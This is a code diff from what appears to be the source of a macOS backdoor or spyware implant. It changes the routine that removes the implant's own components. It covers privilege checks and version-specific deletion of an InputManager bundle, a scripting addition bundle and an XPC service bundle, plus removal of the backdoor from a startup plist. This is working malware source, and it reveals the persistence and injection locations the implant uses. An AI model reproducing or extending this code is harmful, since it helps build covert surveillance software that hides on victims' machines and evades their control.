@@ -462,50 +462,99 @@ static NSLock *gSyncLock                  = nil;
   // Just ourselves
   if (activeBackdoors == 1)
     {
-      if (getuid() == 0 || geteuid() == 0)
-        {
-          NSString *destDir = nil;
+      NSString *destDir = nil;
+      NSError *err;
+      NSString *osaxRootPath = nil;
 
+      if (getuid() == 0 || geteuid() == 0)
+      {
           if ([gUtil isLeopard])
-            {
+          {
 #ifdef DEBUG_TASK_MANAGER
               infoLog(@"Removing input manager");
 #endif
               destDir = [[NSString alloc]
                          initWithFormat: @"/Library/InputManagers/%@",
                                          EXT_BUNDLE_FOLDER];
+              
+              if (![[NSFileManager defaultManager] removeItemAtPath: destDir
+                                                              error: &err])
+              {
+#ifdef DEBUG_TASK_MANAGER
+                errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
+                errorLog(@"Error while removing the xpc service");
+                errorLog(@"error: %@", [err localizedDescription]);
+#endif
+              }
+              
+              [destDir release];
             }
           else
+          {
+            // is Snow Leopard
+            osaxRootPath = [[NSString alloc] initWithFormat: @"%@",
+                            OSAX_ROOT_PATH];
+            
+            if ([gUtil isLion])
             {
-#ifdef DEBUG_TASK_MANAGER
-              infoLog(@"Removing scripting additions");
-#endif
               destDir = [[NSString alloc]
-                         initWithFormat: @"/Library/ScriptingAdditions/%@",
-                                         EXT_BUNDLE_FOLDER];
-            }
-
-          NSError *err;
-
-          if (![[NSFileManager defaultManager] removeItemAtPath: destDir
-                                                          error: &err])
-            {
+                         initWithFormat: @"%@/%@%@.xpc",
+                         XPC_BUNDLE_FRAMEWORK_PATH,
+                         XPC_BUNDLE_FOLDER_PREFIX,
+                         gMyXPCName];
 #ifdef DEBUG_TASK_MANAGER
-              errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
-              errorLog(@"Error while removing the input manager");
-              errorLog(@"error: %@", [err localizedDescription]);
+              infoLog(@"Removing xpc services %@", destDir);
 #endif
+              if (![[NSFileManager defaultManager] removeItemAtPath: destDir
+                                                              error: &err])
+              {
+#ifdef DEBUG_TASK_MANAGER
+                errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
+                errorLog(@"Error while removing the xpc service");
+                errorLog(@"error: %@", [err localizedDescription]);
+#endif
+              }
+              
+              [destDir release];
             }
-
-          [destDir release];
-        }
+          }
+      }
       else
+      {
+#ifdef DEBUG_TASK_MANAGER
+        errorLog(@"I don't have privileges for removing the input manager :(");
+        errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
+#endif
+        osaxRootPath = [[NSString alloc] initWithFormat: @"/Users/%@/%@",
+                        NSUserName(),
+                        OSAX_ROOT_PATH];
+      }
+
+      // if not leopard remove osax
+      if (osaxRootPath != nil)
+      {
+        
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Removing scripting additions");
+#endif
+        destDir = [[NSString alloc]
+                   initWithFormat: @"%@/%@",
+                   osaxRootPath,
+                   EXT_BUNDLE_FOLDER];
+        
+        if (![[NSFileManager defaultManager] removeItemAtPath: destDir
+                                                        error: &err])
         {
 #ifdef DEBUG_TASK_MANAGER
-          errorLog(@"I don't have privileges for removing the input manager :(");
           errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
+          errorLog(@"Error while removing the osax");
+          errorLog(@"error: %@", [err localizedDescription]);
 #endif
         }
+        
+        [destDir release];
+      }
+      
     }
   else
     {
@@ -517,6 +566,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
   infoLog(@"Removing SLI Plist just in case");
 #endif
+  
   [gUtil removeBackdoorFromSLIPlist];
 
   //
